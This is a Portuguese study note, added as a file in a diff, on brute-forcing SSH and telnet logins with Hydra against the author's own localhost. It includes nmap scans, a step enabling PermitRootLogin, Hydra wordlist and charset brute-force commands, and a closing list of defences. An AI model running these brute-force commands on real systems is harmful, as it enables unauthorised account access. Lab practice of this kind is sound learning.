@@ -1,0 +1,70 @@
+ssh - >  serviço para conexões retomars com criptografia 
+telnet - >  serviço pra conexão remota sem criptografia 
+
+Fazendo ataque no ssh na maquina localhost: 
+
+apt-get install openssh-server 
+-------------------------------------
+nmap -sV 127.0.0.1 
+Starting Nmap 7.80 ( https://nmap.org ) at 2022-06-13 21:28 -03
+Nmap scan report for localhost (127.0.0.1)
+PORT   STATE  SERVICE VERSION
+22/tcp open   ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+23/tcp closed telnet
+-------------------------------------
+caso o serviço ssh esteja off: 
+service ssh start 
+service ssh status 
+-------------------------------------
+fazendo conexões ssh: 
+usuári: afrogaara
+ssh 127.0.0.1 -l afrogaara 
+senha: gaara 
+-------------------------------------
+configurando ssh: 
+nano /etc/ssh/sshd_config 
+ctrl + w 
+root 
+PermitRootLogin: yes 
+service ssh restart 
+-------------------------------------
+Hydra: 
+hydra -l usuário (usuário do servidor)
+hydra -L users_wordlist (wordlist de usuários)
+-p senha 
+-P wordlist_senhas 
+-V modo verbose 
+-o gera uma saída (salva as informações do ataque)  
+  MODO DE USO: 
+  hydra -l afrogaara -P wordlist.txt ssh 
+  hydra -l afrogaara -P wordlist.txt -o /tmp/resultado 127.0.0.1 ssh -V
+-x MIN:MAX:CHARSET 
+  MIN:MAX 
+  - > 4:4 (a senha tem 4 digítos)
+  - > 1:4 (a senha tem de 1 a 4 digítos)
+  
+  MIN:MAX:CHARASET 
+  - > 4:4a (a senha tem 4 digítos e todas são letras minusculas) 
+  - > 4:4A (a senha tem 4 digítos e todas são letras maisculas) 
+  - > 4:41 (a senha tem 4 digítos e todas são números) 
+  - > 4:4agr (faça um brutal force com 4 digítos com as combinações de caracteres "agr")
+  
+  hydra -l afrogaar -x 4:4gra ssh -V
+  _ _ _ _ = são 4 digítos 
+  3 * 3 * 3 * 3 = 81 combinações de palavras possiveis 
+  --------------------------------
+  Atacando um serviço de telnet 
+  - > apt-get install telnetd
+  - > apt-get install xinetd
+   - hydra IP -l nome do usuario -P wordlist_senhas telnet -V 
+
+
+Evitando ataque de brutalforce em serviços: 
+
+- > Em primeiro lugar, serviços por mais atualizados que estejam estão vulneraveis a ataque de brutalforce
+- > Senhas fortes 
+- > Deixar portas restritas pra um determinado número de IP
+- > IDS OR IPS 
+- > Políticas de seguranças que restringem o ip após uma determinada tentativa de erros 
+
+
